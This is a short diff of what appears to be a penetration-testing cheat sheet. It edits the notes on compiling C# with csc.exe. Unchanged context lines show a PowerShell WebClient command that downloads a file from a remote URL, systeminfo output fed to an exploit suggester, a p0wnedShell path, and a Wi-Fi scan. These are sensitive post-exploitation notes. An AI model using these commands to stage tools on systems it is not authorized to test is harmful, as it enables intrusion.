@@ -5,8 +5,10 @@ $WebClient = New-Object System.Net.WebClient $WebClient.DownloadFile("http(s)://
 systeminfo (Download output and run windows exploit suggestor)
 
 #Compile Windows
-Client Side Complies: cd \Windows\Microsoft.NET\Framework\v{Version Number} csc.exe /unsafe /reference:{Call all in .cs File 1 ref arg per ref} /win32icon:C:\p0wnedShell{ProjName}.ico /out:C:{ProjName\Path}.{Extension}(ie exe or DLL) /platform:x86 "C:{Proj location}*.cs"
+- C:\Windows\Microsoft.NET\Framework\v{Version Number} csc.exe /unsafe /reference:{Call all in .cs .cmdline File 1 ref arg per ref} /win32icon:C:\p0wnedShell{ProjName}.ico /out:C:{ProjName\Path}.{Extension}(ie exe or DLL) /platform:x86 "C:{Proj location}*.cs"
 
+- c:\windows\Microsoft.NET\Framework\v3.5\bin\csc.exe /t:exe /out:MyApplication.exe MyApplication.cs
+            
 #Linux (Generic)
 Scan Wifi info: iw wlan0 scan
 
